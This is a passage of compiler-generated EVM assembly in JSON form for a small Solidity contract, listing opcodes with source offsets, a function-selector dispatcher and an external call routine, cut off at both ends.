											"name": "DUP1"
										},
										{
											"begin": 59,
											"end": 649,
											"name": "PUSH",
											"value": "8DA5CB5B"
										},
										{
											"begin": 59,
											"end": 649,
											"name": "EQ"
										},
										{
											"begin": 59,
											"end": 649,
											"name": "PUSH [tag]",
											"value": "6"
										},
										{
											"begin": 59,
											"end": 649,
											"name": "JUMPI"
										},
										{
											"begin": 59,
											"end": 649,
											"name": "DUP1"
										},
										{
											"begin": 59,
											"end": 649,
											"name": "PUSH",
											"value": "B8E010DE"
										},
										{
											"begin": 59,
											"end": 649,
											"name": "EQ"
										},
										{
											"begin": 59,
											"end": 649,
											"name": "PUSH [tag]",
											"value": "7"
										},
										{
											"begin": 59,
											"end": 649,
											"name": "JUMPI"
										},
										{
											"begin": 59,
											"end": 649,
											"name": "DUP1"
										},
										{
											"begin": 59,
											"end": 649,
											"name": "PUSH",
											"value": "CBFC4BCE"
										},
										{
											"begin": 59,
											"end": 649,
											"name": "EQ"
										},
										{
											"begin": 59,
											"end": 649,
											"name": "PUSH [tag]",
											"value": "8"
										},
										{
											"begin": 59,
											"end": 649,
											"name": "JUMPI"
										},
										{
											"begin": 59,
											"end": 649,
											"name": "tag",
											"value": "1"
										},
										{
											"begin": 59,
											"end": 649,
											"name": "JUMPDEST"
										},
										{
											"begin": 59,
											"end": 649,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 59,
											"end": 649,
											"name": "DUP1"
										},
										{
											"begin": 59,
											"end": 649,
											"name": "REVERT"
										},
										{
											"begin": 106,
											"end": 130,
											"name": "tag",
											"value": "2"
										},
										{
											"begin": 106,
											"end": 130,
											"name": "JUMPDEST"
										},
										{
											"begin": 106,
											"end": 130,
											"name": "CALLVALUE"
										},
										{
											"begin": 8,
											"end": 17,
											"name": "DUP1"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "ISZERO"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "PUSH [tag]",
											"value": "9"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPI"
										},
										{
											"begin": 30,
											"end": 31,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 27,
											"end": 28,
											"name": "DUP1"
										},
										{
											"begin": 20,
											"end": 32,
											"name": "REVERT"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "tag",
											"value": "9"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPDEST"
										},
										{
											"begin": 106,
											"end": 130,
											"name": "POP"
										},
										{
											"begin": 106,
											"end": 130,
											"name": "PUSH [tag]",
											"value": "10"
										},
										{
											"begin": 106,
											"end": 130,
											"name": "PUSH [tag]",
											"value": "11"
										},
										{
											"begin": 106,
											"end": 130,
											"name": "JUMP"
										},
										{
											"begin": 106,
											"end": 130,
											"name": "tag",
											"value": "10"
										},
										{
											"begin": 106,
											"end": 130,
											"name": "JUMPDEST"
										},
										{
											"begin": 106,
											"end": 130,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 106,
											"end": 130,
											"name": "MLOAD"
										},
										{
											"begin": 106,
											"end": 130,
											"name": "DUP1"
										},
										{
											"begin": 106,
											"end": 130,
											"name": "DUP3"
										},
										{
											"begin": 106,
											"end": 130,
											"name": "DUP2"
										},
										{
											"begin": 106,
											"end": 130,
											"name": "MSTORE"
										},
										{
											"begin": 106,
											"end": 130,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 106,
											"end": 130,
											"name": "ADD"
										},
										{
											"begin": 106,
											"end": 130,
											"name": "SWAP2"
										},
										{
											"begin": 106,
											"end": 130,
											"name": "POP"
										},
										{
											"begin": 106,
											"end": 130,
											"name": "POP"
										},
										{
											"begin": 106,
											"end": 130,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 106,
											"end": 130,
											"name": "MLOAD"
										},
										{
											"begin": 106,
											"end": 130,
											"name": "DUP1"
										},
										{
											"begin": 106,
											"end": 130,
											"name": "SWAP2"
										},
										{
											"begin": 106,
											"end": 130,
											"name": "SUB"
										},
										{
											"begin": 106,
											"end": 130,
											"name": "SWAP1"
										},
										{
											"begin": 106,
											"end": 130,
											"name": "RETURN"
										},
										{
											"begin": 577,
											"end": 644,
											"name": "tag",
											"value": "3"
										},
										{
											"begin": 577,
											"end": 644,
											"name": "JUMPDEST"
										},
										{
											"begin": 577,
											"end": 644,
											"name": "CALLVALUE"
										},
										{
											"begin": 8,
											"end": 17,
											"name": "DUP1"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "ISZERO"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "PUSH [tag]",
											"value": "12"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPI"
										},
										{
											"begin": 30,
											"end": 31,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 27,
											"end": 28,
											"name": "DUP1"
										},
										{
											"begin": 20,
											"end": 32,
											"name": "REVERT"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "tag",
											"value": "12"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPDEST"
										},
										{
											"begin": 577,
											"end": 644,
											"name": "POP"
										},
										{
											"begin": 577,
											"end": 644,
											"name": "PUSH [tag]",
											"value": "13"
										},
										{
											"begin": 577,
											"end": 644,
											"name": "PUSH [tag]",
											"value": "14"
										},
										{
											"begin": 577,
											"end": 644,
											"name": "JUMP"
										},
										{
											"begin": 577,
											"end": 644,
											"name": "tag",
											"value": "13"
										},
										{
											"begin": 577,
											"end": 644,
											"name": "JUMPDEST"
										},
										{
											"begin": 577,
											"end": 644,
											"name": "STOP"
										},
										{
											"begin": 137,
											"end": 151,
											"name": "tag",
											"value": "4"
										},
										{
											"begin": 137,
											"end": 151,
											"name": "JUMPDEST"
										},
										{
											"begin": 137,
											"end": 151,
											"name": "CALLVALUE"
										},
										{
											"begin": 8,
											"end": 17,
											"name": "DUP1"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "ISZERO"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "PUSH [tag]",
											"value": "15"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPI"
										},
										{
											"begin": 30,
											"end": 31,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 27,
											"end": 28,
											"name": "DUP1"
										},
										{
											"begin": 20,
											"end": 32,
											"name": "REVERT"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "tag",
											"value": "15"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPDEST"
										},
										{
											"begin": 137,
											"end": 151,
											"name": "POP"
										},
										{
											"begin": 137,
											"end": 151,
											"name": "PUSH [tag]",
											"value": "16"
										},
										{
											"begin": 137,
											"end": 151,
											"name": "PUSH [tag]",
											"value": "17"
										},
										{
											"begin": 137,
											"end": 151,
											"name": "JUMP"
										},
										{
											"begin": 137,
											"end": 151,
											"name": "tag",
											"value": "16"
										},
										{
											"begin": 137,
											"end": 151,
											"name": "JUMPDEST"
										},
										{
											"begin": 137,
											"end": 151,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 137,
											"end": 151,
											"name": "MLOAD"
										},
										{
											"begin": 137,
											"end": 151,
											"name": "DUP1"
										},
										{
											"begin": 137,
											"end": 151,
											"name": "DUP3"
										},
										{
											"begin": 137,
											"end": 151,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 137,
											"end": 151,
											"name": "AND"
										},
										{
											"begin": 137,
											"end": 151,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 137,
											"end": 151,
											"name": "AND"
										},
										{
											"begin": 137,
											"end": 151,
											"name": "DUP2"
										},
										{
											"begin": 137,
											"end": 151,
											"name": "MSTORE"
										},
										{
											"begin": 137,
											"end": 151,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 137,
											"end": 151,
											"name": "ADD"
										},
										{
											"begin": 137,
											"end": 151,
											"name": "SWAP2"
										},
										{
											"begin": 137,
											"end": 151,
											"name": "POP"
										},
										{
											"begin": 137,
											"end": 151,
											"name": "POP"
										},
										{
											"begin": 137,
											"end": 151,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 137,
											"end": 151,
											"name": "MLOAD"
										},
										{
											"begin": 137,
											"end": 151,
											"name": "DUP1"
										},
										{
											"begin": 137,
											"end": 151,
											"name": "SWAP2"
										},
										{
											"begin": 137,
											"end": 151,
											"name": "SUB"
										},
										{
											"begin": 137,
											"end": 151,
											"name": "SWAP1"
										},
										{
											"begin": 137,
											"end": 151,
											"name": "RETURN"
										},
										{
											"begin": 158,
											"end": 223,
											"name": "tag",
											"value": "5"
										},
										{
											"begin": 158,
											"end": 223,
											"name": "JUMPDEST"
										},
										{
											"begin": 158,
											"end": 223,
											"name": "CALLVALUE"
										},
										{
											"begin": 8,
											"end": 17,
											"name": "DUP1"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "ISZERO"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "PUSH [tag]",
											"value": "18"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPI"
										},
										{
											"begin": 30,
											"end": 31,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 27,
											"end": 28,
											"name": "DUP1"
										},
										{
											"begin": 20,
											"end": 32,
											"name": "REVERT"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "tag",
											"value": "18"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPDEST"
										},
										{
											"begin": 158,
											"end": 223,
											"name": "POP"
										},
										{
											"begin": 158,
											"end": 223,
											"name": "PUSH [tag]",
											"value": "19"
										},
										{
											"begin": 158,
											"end": 223,
											"name": "PUSH [tag]",
											"value": "20"
										},
										{
											"begin": 158,
											"end": 223,
											"name": "JUMP"
										},
										{
											"begin": 158,
											"end": 223,
											"name": "tag",
											"value": "19"
										},
										{
											"begin": 158,
											"end": 223,
											"name": "JUMPDEST"
										},
										{
											"begin": 158,
											"end": 223,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 158,
											"end": 223,
											"name": "MLOAD"
										},
										{
											"begin": 158,
											"end": 223,
											"name": "DUP1"
										},
										{
											"begin": 158,
											"end": 223,
											"name": "DUP1"
										},
										{
											"begin": 158,
											"end": 223,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 158,
											"end": 223,
											"name": "ADD"
										},
										{
											"begin": 158,
											"end": 223,
											"name": "DUP3"
										},
										{
											"begin": 158,
											"end": 223,
											"name": "DUP2"
										},
										{
											"begin": 158,
											"end": 223,
											"name": "SUB"
										},
										{
											"begin": 158,
											"end": 223,
											"name": "DUP3"
										},
										{
											"begin": 158,
											"end": 223,
											"name": "MSTORE"
										},
										{
											"begin": 158,
											"end": 223,
											"name": "DUP4"
										},
										{
											"begin": 158,
											"end": 223,
											"name": "DUP2"
										},
										{
											"begin": 158,
											"end": 223,
											"name": "DUP2"
										},
										{
											"begin": 158,
											"end": 223,
											"name": "MLOAD"
										},
										{
											"begin": 158,
											"end": 223,
											"name": "DUP2"
										},
										{
											"begin": 158,
											"end": 223,
											"name": "MSTORE"
										},
										{
											"begin": 158,
											"end": 223,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 158,
											"end": 223,
											"name": "ADD"
										},
										{
											"begin": 158,
											"end": 223,
											"name": "SWAP2"
										},
										{
											"begin": 158,
											"end": 223,
											"name": "POP"
										},
										{
											"begin": 158,
											"end": 223,
											"name": "DUP1"
										},
										{
											"begin": 158,
											"end": 223,
											"name": "MLOAD"
										},
										{
											"begin": 158,
											"end": 223,
											"name": "SWAP1"
										},
										{
											"begin": 158,
											"end": 223,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 158,
											"end": 223,
											"name": "ADD"
										},
										{
											"begin": 158,
											"end": 223,
											"name": "SWAP1"
										},
										{
											"begin": 158,
											"end": 223,
											"name": "DUP1"
										},
										{
											"begin": 158,
											"end": 223,
											"name": "DUP4"
										},
										{
											"begin": 158,
											"end": 223,
											"name": "DUP4"
										},
										{
											"begin": 23,
											"end": 24,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 8,
											"end": 108,
											"name": "tag",
											"value": "21"
										},
										{
											"begin": 8,
											"end": 108,
											"name": "JUMPDEST"
										},
										{
											"begin": 33,
											"end": 36,
											"name": "DUP4"
										},
										{
											"begin": 30,
											"end": 31,
											"name": "DUP2"
										},
										{
											"begin": 27,
											"end": 37,
											"name": "LT"
										},
										{
											"begin": 8,
											"end": 108,
											"name": "ISZERO"
										},
										{
											"begin": 8,
											"end": 108,
											"name": "PUSH [tag]",
											"value": "22"
										},
										{
											"begin": 8,
											"end": 108,
											"name": "JUMPI"
										},
										{
											"begin": 99,
											"end": 100,
											"name": "DUP1"
										},
										{
											"begin": 94,
											"end": 97,
											"name": "DUP3"
										},
										{
											"begin": 90,
											"end": 101,
											"name": "ADD"
										},
										{
											"begin": 84,
											"end": 102,
											"name": "MLOAD"
										},
										{
											"begin": 80,
											"end": 81,
											"name": "DUP2"
										},
										{
											"begin": 75,
											"end": 78,
											"name": "DUP5"
										},
										{
											"begin": 71,
											"end": 82,
											"name": "ADD"
										},
										{
											"begin": 64,
											"end": 103,
											"name": "MSTORE"
										},
										{
											"begin": 52,
											"end": 54,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 49,
											"end": 50,
											"name": "DUP2"
										},
										{
											"begin": 45,
											"end": 55,
											"name": "ADD"
										},
										{
											"begin": 40,
											"end": 55,
											"name": "SWAP1"
										},
										{
											"begin": 40,
											"end": 55,
											"name": "POP"
										},
										{
											"begin": 8,
											"end": 108,
											"name": "PUSH [tag]",
											"value": "21"
										},
										{
											"begin": 8,
											"end": 108,
											"name": "JUMP"
										},
										{
											"begin": 8,
											"end": 108,
											"name": "tag",
											"value": "22"
										},
										{
											"begin": 8,
											"end": 108,
											"name": "JUMPDEST"
										},
										{
											"begin": 12,
											"end": 26,
											"name": "POP"
										},
										{
											"begin": 158,
											"end": 223,
											"name": "POP"
										},
										{
											"begin": 158,
											"end": 223,
											"name": "POP"
										},
										{
											"begin": 158,
											"end": 223,
											"name": "POP"
										},
										{
											"begin": 158,
											"end": 223,
											"name": "SWAP1"
										},
										{
											"begin": 158,
											"end": 223,
											"name": "POP"
										},
										{
											"begin": 158,
											"end": 223,
											"name": "SWAP1"
										},
										{
											"begin": 158,
											"end": 223,
											"name": "DUP2"
										},
										{
											"begin": 158,
											"end": 223,
											"name": "ADD"
										},
										{
											"begin": 158,
											"end": 223,
											"name": "SWAP1"
										},
										{
											"begin": 158,
											"end": 223,
											"name": "PUSH",
											"value": "1F"
										},
										{
											"begin": 158,
											"end": 223,
											"name": "AND"
										},
										{
											"begin": 158,
											"end": 223,
											"name": "DUP1"
										},
										{
											"begin": 158,
											"end": 223,
											"name": "ISZERO"
										},
										{
											"begin": 158,
											"end": 223,
											"name": "PUSH [tag]",
											"value": "24"
										},
										{
											"begin": 158,
											"end": 223,
											"name": "JUMPI"
										},
										{
											"begin": 158,
											"end": 223,
											"name": "DUP1"
										},
										{
											"begin": 158,
											"end": 223,
											"name": "DUP3"
										},
										{
											"begin": 158,
											"end": 223,
											"name": "SUB"
										},
										{
											"begin": 158,
											"end": 223,
											"name": "DUP1"
										},
										{
											"begin": 158,
											"end": 223,
											"name": "MLOAD"
										},
										{
											"begin": 158,
											"end": 223,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": 158,
											"end": 223,
											"name": "DUP4"
										},
										{
											"begin": 158,
											"end": 223,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 158,
											"end": 223,
											"name": "SUB"
										},
										{
											"begin": 158,
											"end": 223,
											"name": "PUSH",
											"value": "100"
										},
										{
											"begin": 158,
											"end": 223,
											"name": "EXP"
										},
										{
											"begin": 158,
											"end": 223,
											"name": "SUB"
										},
										{
											"begin": 158,
											"end": 223,
											"name": "NOT"
										},
										{
											"begin": 158,
											"end": 223,
											"name": "AND"
										},
										{
											"begin": 158,
											"end": 223,
											"name": "DUP2"
										},
										{
											"begin": 158,
											"end": 223,
											"name": "MSTORE"
										},
										{
											"begin": 158,
											"end": 223,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 158,
											"end": 223,
											"name": "ADD"
										},
										{
											"begin": 158,
											"end": 223,
											"name": "SWAP2"
										},
										{
											"begin": 158,
											"end": 223,
											"name": "POP"
										},
										{
											"begin": 158,
											"end": 223,
											"name": "tag",
											"value": "24"
										},
										{
											"begin": 158,
											"end": 223,
											"name": "JUMPDEST"
										},
										{
											"begin": 158,
											"end": 223,
											"name": "POP"
										},
										{
											"begin": 158,
											"end": 223,
											"name": "SWAP3"
										},
										{
											"begin": 158,
											"end": 223,
											"name": "POP"
										},
										{
											"begin": 158,
											"end": 223,
											"name": "POP"
										},
										{
											"begin": 158,
											"end": 223,
											"name": "POP"
										},
										{
											"begin": 158,
											"end": 223,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 158,
											"end": 223,
											"name": "MLOAD"
										},
										{
											"begin": 158,
											"end": 223,
											"name": "DUP1"
										},
										{
											"begin": 158,
											"end": 223,
											"name": "SWAP2"
										},
										{
											"begin": 158,
											"end": 223,
											"name": "SUB"
										},
										{
											"begin": 158,
											"end": 223,
											"name": "SWAP1"
										},
										{
											"begin": 158,
											"end": 223,
											"name": "RETURN"
										},
										{
											"begin": 78,
											"end": 99,
											"name": "tag",
											"value": "6"
										},
										{
											"begin": 78,
											"end": 99,
											"name": "JUMPDEST"
										},
										{
											"begin": 78,
											"end": 99,
											"name": "CALLVALUE"
										},
										{
											"begin": 8,
											"end": 17,
											"name": "DUP1"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "ISZERO"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "PUSH [tag]",
											"value": "25"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPI"
										},
										{
											"begin": 30,
											"end": 31,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 27,
											"end": 28,
											"name": "DUP1"
										},
										{
											"begin": 20,
											"end": 32,
											"name": "REVERT"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "tag",
											"value": "25"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPDEST"
										},
										{
											"begin": 78,
											"end": 99,
											"name": "POP"
										},
										{
											"begin": 78,
											"end": 99,
											"name": "PUSH [tag]",
											"value": "26"
										},
										{
											"begin": 78,
											"end": 99,
											"name": "PUSH [tag]",
											"value": "27"
										},
										{
											"begin": 78,
											"end": 99,
											"name": "JUMP"
										},
										{
											"begin": 78,
											"end": 99,
											"name": "tag",
											"value": "26"
										},
										{
											"begin": 78,
											"end": 99,
											"name": "JUMPDEST"
										},
										{
											"begin": 78,
											"end": 99,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 78,
											"end": 99,
											"name": "MLOAD"
										},
										{
											"begin": 78,
											"end": 99,
											"name": "DUP1"
										},
										{
											"begin": 78,
											"end": 99,
											"name": "DUP3"
										},
										{
											"begin": 78,
											"end": 99,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 78,
											"end": 99,
											"name": "AND"
										},
										{
											"begin": 78,
											"end": 99,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 78,
											"end": 99,
											"name": "AND"
										},
										{
											"begin": 78,
											"end": 99,
											"name": "DUP2"
										},
										{
											"begin": 78,
											"end": 99,
											"name": "MSTORE"
										},
										{
											"begin": 78,
											"end": 99,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 78,
											"end": 99,
											"name": "ADD"
										},
										{
											"begin": 78,
											"end": 99,
											"name": "SWAP2"
										},
										{
											"begin": 78,
											"end": 99,
											"name": "POP"
										},
										{
											"begin": 78,
											"end": 99,
											"name": "POP"
										},
										{
											"begin": 78,
											"end": 99,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 78,
											"end": 99,
											"name": "MLOAD"
										},
										{
											"begin": 78,
											"end": 99,
											"name": "DUP1"
										},
										{
											"begin": 78,
											"end": 99,
											"name": "SWAP2"
										},
										{
											"begin": 78,
											"end": 99,
											"name": "SUB"
										},
										{
											"begin": 78,
											"end": 99,
											"name": "SWAP1"
										},
										{
											"begin": 78,
											"end": 99,
											"name": "RETURN"
										},
										{
											"begin": 230,
											"end": 268,
											"name": "tag",
											"value": "7"
										},
										{
											"begin": 230,
											"end": 268,
											"name": "JUMPDEST"
										},
										{
											"begin": 230,
											"end": 268,
											"name": "CALLVALUE"
										},
										{
											"begin": 8,
											"end": 17,
											"name": "DUP1"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "ISZERO"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "PUSH [tag]",
											"value": "28"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPI"
										},
										{
											"begin": 30,
											"end": 31,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 27,
											"end": 28,
											"name": "DUP1"
										},
										{
											"begin": 20,
											"end": 32,
											"name": "REVERT"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "tag",
											"value": "28"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPDEST"
										},
										{
											"begin": 230,
											"end": 268,
											"name": "POP"
										},
										{
											"begin": 230,
											"end": 268,
											"name": "PUSH [tag]",
											"value": "29"
										},
										{
											"begin": 230,
											"end": 268,
											"name": "PUSH [tag]",
											"value": "30"
										},
										{
											"begin": 230,
											"end": 268,
											"name": "JUMP"
										},
										{
											"begin": 230,
											"end": 268,
											"name": "tag",
											"value": "29"
										},
										{
											"begin": 230,
											"end": 268,
											"name": "JUMPDEST"
										},
										{
											"begin": 230,
											"end": 268,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 230,
											"end": 268,
											"name": "MLOAD"
										},
										{
											"begin": 230,
											"end": 268,
											"name": "DUP1"
										},
										{
											"begin": 230,
											"end": 268,
											"name": "DUP3"
										},
										{
											"begin": 230,
											"end": 268,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 230,
											"end": 268,
											"name": "NOT"
										},
										{
											"begin": 230,
											"end": 268,
											"name": "AND"
										},
										{
											"begin": 230,
											"end": 268,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 230,
											"end": 268,
											"name": "NOT"
										},
										{
											"begin": 230,
											"end": 268,
											"name": "AND"
										},
										{
											"begin": 230,
											"end": 268,
											"name": "DUP2"
										},
										{
											"begin": 230,
											"end": 268,
											"name": "MSTORE"
										},
										{
											"begin": 230,
											"end": 268,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 230,
											"end": 268,
											"name": "ADD"
										},
										{
											"begin": 230,
											"end": 268,
											"name": "SWAP2"
										},
										{
											"begin": 230,
											"end": 268,
											"name": "POP"
										},
										{
											"begin": 230,
											"end": 268,
											"name": "POP"
										},
										{
											"begin": 230,
											"end": 268,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 230,
											"end": 268,
											"name": "MLOAD"
										},
										{
											"begin": 230,
											"end": 268,
											"name": "DUP1"
										},
										{
											"begin": 230,
											"end": 268,
											"name": "SWAP2"
										},
										{
											"begin": 230,
											"end": 268,
											"name": "SUB"
										},
										{
											"begin": 230,
											"end": 268,
											"name": "SWAP1"
										},
										{
											"begin": 230,
											"end": 268,
											"name": "RETURN"
										},
										{
											"begin": 339,
											"end": 571,
											"name": "tag",
											"value": "8"
										},
										{
											"begin": 339,
											"end": 571,
											"name": "JUMPDEST"
										},
										{
											"begin": 339,
											"end": 571,
											"name": "CALLVALUE"
										},
										{
											"begin": 8,
											"end": 17,
											"name": "DUP1"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "ISZERO"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "PUSH [tag]",
											"value": "31"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPI"
										},
										{
											"begin": 30,
											"end": 31,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 27,
											"end": 28,
											"name": "DUP1"
										},
										{
											"begin": 20,
											"end": 32,
											"name": "REVERT"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "tag",
											"value": "31"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPDEST"
										},
										{
											"begin": 339,
											"end": 571,
											"name": "POP"
										},
										{
											"begin": 339,
											"end": 571,
											"name": "PUSH [tag]",
											"value": "32"
										},
										{
											"begin": 339,
											"end": 571,
											"name": "PUSH",
											"value": "4"
										},
										{
											"begin": 339,
											"end": 571,
											"name": "DUP1"
										},
										{
											"begin": 339,
											"end": 571,
											"name": "CALLDATASIZE"
										},
										{
											"begin": 339,
											"end": 571,
											"name": "SUB"
										},
										{
											"begin": 339,
											"end": 571,
											"name": "DUP2"
										},
										{
											"begin": 339,
											"end": 571,
											"name": "ADD"
										},
										{
											"begin": 339,
											"end": 571,
											"name": "SWAP1"
										},
										{
											"begin": 339,
											"end": 571,
											"name": "DUP1"
										},
										{
											"begin": 339,
											"end": 571,
											"name": "DUP1"
										},
										{
											"begin": 339,
											"end": 571,
											"name": "CALLDATALOAD"
										},
										{
											"begin": 339,
											"end": 571,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 339,
											"end": 571,
											"name": "AND"
										},
										{
											"begin": 339,
											"end": 571,
											"name": "SWAP1"
										},
										{
											"begin": 339,
											"end": 571,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 339,
											"end": 571,
											"name": "ADD"
										},
										{
											"begin": 339,
											"end": 571,
											"name": "SWAP1"
										},
										{
											"begin": 339,
											"end": 571,
											"name": "SWAP3"
										},
										{
											"begin": 339,
											"end": 571,
											"name": "SWAP2"
										},
										{
											"begin": 339,
											"end": 571,
											"name": "SWAP1"
										},
										{
											"begin": 339,
											"end": 571,
											"name": "POP"
										},
										{
											"begin": 339,
											"end": 571,
											"name": "POP"
										},
										{
											"begin": 339,
											"end": 571,
											"name": "POP"
										},
										{
											"begin": 339,
											"end": 571,
											"name": "PUSH [tag]",
											"value": "33"
										},
										{
											"begin": 339,
											"end": 571,
											"name": "JUMP"
										},
										{
											"begin": 339,
											"end": 571,
											"name": "tag",
											"value": "32"
										},
										{
											"begin": 339,
											"end": 571,
											"name": "JUMPDEST"
										},
										{
											"begin": 339,
											"end": 571,
											"name": "STOP"
										},
										{
											"begin": 106,
											"end": 130,
											"name": "tag",
											"value": "11"
										},
										{
											"begin": 106,
											"end": 130,
											"name": "JUMPDEST"
										},
										{
											"begin": 106,
											"end": 130,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": 106,
											"end": 130,
											"name": "SLOAD"
										},
										{
											"begin": 106,
											"end": 130,
											"name": "DUP2"
										},
										{
											"begin": 106,
											"end": 130,
											"name": "JUMP",
											"value": "[out]"
										},
										{
											"begin": 577,
											"end": 644,
											"name": "tag",
											"value": "14"
										},
										{
											"begin": 577,
											"end": 644,
											"name": "JUMPDEST"
										},
										{
											"begin": 614,
											"end": 616,
											"name": "PUSH",
											"value": "2"
										},
										{
											"begin": 614,
											"end": 616,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 614,
											"end": 616,
											"name": "SWAP1"
										},
										{
											"begin": 614,
											"end": 616,
											"name": "SLOAD"
										},
										{
											"begin": 614,
											"end": 616,
											"name": "SWAP1"
										},
										{
											"begin": 614,
											"end": 616,
											"name": "PUSH",
											"value": "100"
										},
										{
											"begin": 614,
											"end": 616,
											"name": "EXP"
										},
										{
											"begin": 614,
											"end": 616,
											"name": "SWAP1"
										},
										{
											"begin": 614,
											"end": 616,
											"name": "DIV"
										},
										{
											"begin": 614,
											"end": 616,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 614,
											"end": 616,
											"name": "AND"
										},
										{
											"begin": 614,
											"end": 621,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 614,
											"end": 621,
											"name": "AND"
										},
										{
											"begin": 614,
											"end": 621,
											"name": "PUSH",
											"value": "CBFC4BCE"
										},
										{
											"begin": 630,
											"end": 634,
											"name": "ADDRESS"
										},
										{
											"begin": 614,
											"end": 636,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 614,
											"end": 636,
											"name": "MLOAD"
										},
										{
											"begin": 614,
											"end": 636,
											"name": "DUP3"
										},
										{
											"begin": 614,
											"end": 636,
											"name": "PUSH",
											"value": "FFFFFFFF"
										},
										{
											"begin": 614,
											"end": 636,
											"name": "AND"
										},
										{
											"begin": 614,
											"end": 636,
											"name": "PUSH",
											"value": "100000000000000000000000000000000000000000000000000000000"
										},
										{
											"begin": 614,
											"end": 636,
											"name": "MUL"
										},
										{
											"begin": 614,
											"end": 636,
											"name": "DUP2"
										},
										{
											"begin": 614,
											"end": 636,
											"name": "MSTORE"
										},
										{
											"begin": 614,
											"end": 636,
											"name": "PUSH",
											"value": "4"
										},
										{
											"begin": 614,
											"end": 636,
											"name": "ADD"
										},
										{
											"begin": 614,
											"end": 636,
											"name": "DUP1"
										},
										{
											"begin": 614,
											"end": 636,
											"name": "DUP3"
										},
										{
											"begin": 614,
											"end": 636,
											"name": "PUSH",
